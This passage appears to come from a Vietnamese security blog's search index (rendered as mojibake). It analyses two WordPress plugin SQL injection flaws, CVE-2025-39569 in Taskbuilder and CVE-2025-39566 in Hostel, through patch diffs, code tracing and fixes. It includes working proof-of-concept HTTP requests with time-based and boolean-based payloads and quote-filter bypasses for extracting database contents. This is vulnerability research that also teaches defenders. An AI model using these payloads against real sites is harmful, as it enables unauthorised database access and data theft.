biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 